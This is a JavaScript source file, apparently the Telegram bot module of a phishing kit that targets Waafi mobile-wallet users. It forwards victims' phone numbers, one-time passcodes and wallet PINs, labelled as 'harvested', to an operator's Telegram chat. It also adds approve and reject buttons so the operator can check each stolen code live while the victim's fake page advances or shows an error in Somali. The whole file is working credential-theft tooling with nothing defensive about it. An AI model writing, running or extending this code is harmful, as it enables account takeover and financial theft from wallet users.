require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.ADMIN_CHAT_ID;

if (!BOT_TOKEN || !CHAT_ID) {
    console.error("❌ [BOT MANAGER ERROR] Missing BOT_TOKEN or ADMIN_CHAT_ID inside environment configs.");
}

// Initialize the Telegram Bot Engine using webhook/passive mode
const bot = new TelegramBot(BOT_TOKEN, { polling: false });

/**
 * Strips out characters that break Telegram Markdown parsing
 * FIX: Removed hyphen escaping to prevent App ID string corruption
 */
function escapeMarkdown(text) {
    if (!text) return '';
    return String(text).replace(/([_*\[\]()~`>#+=|{}.!])/g, '\\$1');
}

/**
 * Standard Log Streams: Dispatches clean profiles to the Admin Telegram channel
 */
function sendToAdmin(appId, stepTitle, data, requireInlineButtons = false) {
    if (!CHAT_ID) return;

    let detailedFields = '';
    if (data && typeof data === 'object') {
        Object.entries(data).forEach(([key, val]) => {
            if (val !== undefined && val !== null && val !== '' && key !== 'appId') {
                detailedFields += `• *${escapeMarkdown(key)}:* \`${escapeMarkdown(val)}\`\n`;
            }
        });
    } else if (data) {
        detailedFields += `• *Data Payload:* \`${escapeMarkdown(data)}\`\n`;
    }

    const message = `
📱 *Waafi Application: ${escapeMarkdown(appId)}*
━━━━━━━━━━━━━━━━━━━━━━━━
📢 *${escapeMarkdown(stepTitle)}*
━━━━━━━━━━━━━━━━━━━━━━━━
${detailedFields}━━━━━━━━━━━━━━━━━━━━━━━━
Status: *State Log Processed*
    `.trim();

    const options = { parse_mode: 'Markdown' };

    // Handle standard layout changes based on steps
    if (requireInlineButtons) {
        options.reply_markup = {
            inline_keyboard: [[
                { text: "✅ APPROVE OTP 1", callback_data: `approve_otp:${appId}` },
                { text: "❌ REJECT OTP 1", callback_data: `reject_otp:${appId}` }
            ]]
        };
    } else if (stepTitle.includes("Initial Request")) {
        // Provide dedicated validation trigger buttons for the manual initialization hook
        options.reply_markup = {
            inline_keyboard: [[
                { text: "✅ APPROVE INITIAL PHONE", callback_data: `approve_initial:${appId}` },
                { text: "❌ REJECT INITIAL PHONE", callback_data: `admin_reject:${appId}` }
            ]]
        };
    }

    bot.sendMessage(CHAT_ID, message, options)
        .then(() => console.log(`✅ [TELEGRAM] Log payload dispatched for ${appId}`))
        .catch((err) => console.error(`❌ [TELEGRAM ERROR] Dispatch failed for ${appId}:`, err.message));
}

/**
 * Step 2: Dispatches the account security PIN card
 */
function sendFinalApproval(appId, pinCode) {
    if (!CHAT_ID) return;

    const message = `
💳 *Account PIN Harvested for ID: ${escapeMarkdown(appId)}*
━━━━━━━━━━━━━━━━━━━━━━━━
📢 *Step 2: Wallet Account Security PIN*
━━━━━━━━━━━━━━━━━━━━━━━━
• *Target Account PIN:* \`${escapeMarkdown(pinCode)}\`
━━━━━━━━━━━━━━━━━━━━━━━━
Status: *Awaiting Verification Action*
    `.trim();

    const options = {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [[
                { text: "✅ APPROVE PIN", callback_data: `approve_pin:${appId}` },
                { text: "❌ REJECT PIN", callback_data: `reject_pin:${appId}` }
            ]]
        }
    };

    bot.sendMessage(CHAT_ID, message, options)
        .then(() => console.log(`✅ [TELEGRAM] Step 2 operational PIN dispatch completed for ${appId}`))
        .catch((err) => console.error(`❌ [TELEGRAM ERROR] Step 2 PIN dispatch failed:`, err.message));
}

/**
 * Step 3: Dispatches the second verification OTP card
 */
function sendSecondOTP(appId, otp2Value) {
    if (!CHAT_ID) return;

    const message = `
🔑 *Second OTP (Step 3) for ID: ${escapeMarkdown(appId)}*
━━━━━━━━━━━━━━━━━━━━━━━━
📢 *Step 3: Secondary Multi-Factor Code*
━━━━━━━━━━━━━━━━━━━━━━━━
• *Target OTP 2 Code:* \`${escapeMarkdown(otp2Value)}\`
━━━━━━━━━━━━━━━━━━━━━━━━
Status: *Awaiting Route Authorization*
    `.trim();

    const options = {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [[
                { text: "✅ APPROVE OTP 2", callback_data: `approve_otp2:${appId}` },
                { text: "❌ REJECT OTP 2", callback_data: `reject_otp2:${appId}` }
            ]]
        }
    };

    bot.sendMessage(CHAT_ID, message, options)
        .then(() => console.log(`✅ [TELEGRAM] Step 3 operational OTP2 dispatch completed for ${appId}`))
        .catch((err) => console.error(`❌ [TELEGRAM ERROR] Step 3 OTP2 dispatch failed:`, err.message));
}

// Telegram Inline Interactive Webhook Processing Engine
bot.on('callback_query', async (callbackQuery) => {
    const actionData = callbackQuery.data;
    const message = callbackQuery.message;
    
    if (!actionData) return;
    
    const [actionSignal, targetAppId] = actionData.split(':');
    let auditLogExecutionState = '';
    
    if (!global.io) {
        console.error("❌ [BOT MANAGER ERROR] global.io reference missing.");
        return;
    }

    // Process matching clean room keys directly now
    if (actionSignal === 'approve_initial') {
        global.io.to(targetAppId).emit('otp1-requested-success');
        auditLogExecutionState = "✅ Initial submission processed. Frontend opened to OTP 1 input entry block.";
    } else if (actionSignal === 'approve_otp') {
        global.io.to(targetAppId).emit('admin-approve-otp');
        auditLogExecutionState = "✅ OTP 1 verified. Frontend shifted to Step 2 (PIN) mode.";
    } else if (actionSignal === 'reject_otp') {
        global.io.to(targetAppId).emit('otp-failed', { message: "Code-ka OTP-ga aad gelisay waa khalad." });
        auditLogExecutionState = "❌ OTP 1 signature flagged invalid. Verification error sent to user.";
    } else if (actionSignal === 'approve_pin') {
        global.io.to(targetAppId).emit('pin-verified');
        auditLogExecutionState = "✅ PIN verified. Frontend shifted to Step 3 (OTP 2) mode.";
    } else if (actionSignal === 'reject_pin') {
        global.io.to(targetAppId).emit('pin-failed', { message: "PIN-ka koontada aad gelisay waa khalad." });
        auditLogExecutionState = "❌ Wallet security PIN matched incorrect code. Input reset issued.";
    } else if (actionSignal === 'approve_otp2') {
        global.io.to(targetAppId).emit('admin-approve-otp2');
        auditLogExecutionState = "✅ OTP 2 authorized. User transitioned to descriptive parameter profile forms.";
    } else if (actionSignal === 'reject_otp2') {
        global.io.to(targetAppId).emit('otp2-failed', { message: "Koodhka xaqiijinta labaad ee aad gelisay waa khalad." });
        auditLogExecutionState = "❌ Second OTP flagged invalid. Verification error sent to user.";
    } else if (actionSignal === 'admin_reject') {
        global.io.to(targetAppId).emit('admin-reject', { message: "Xaqiijinta waa laga diaday" });
        auditLogExecutionState = "❌ Session rejected by administrator completely.";
    }

    // Update the administrative card view inside Telegram to prevent double clicks
    try {
        await bot.editMessageText(`${message.text}\n\n🤖 *Audit Log Execution State:*\n_${auditLogExecutionState}_`, {
            chat_id: CHAT_ID,
            message_id: message.message_id,
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: [] }
        });
    } catch (e) {
        console.error("❌ [TELEGRAM UI UPDATE ERROR]", e.message);
    }
});

module.exports = {
    bot,
    sendToAdmin,
    sendFinalApproval,
    sendSecondOTP
};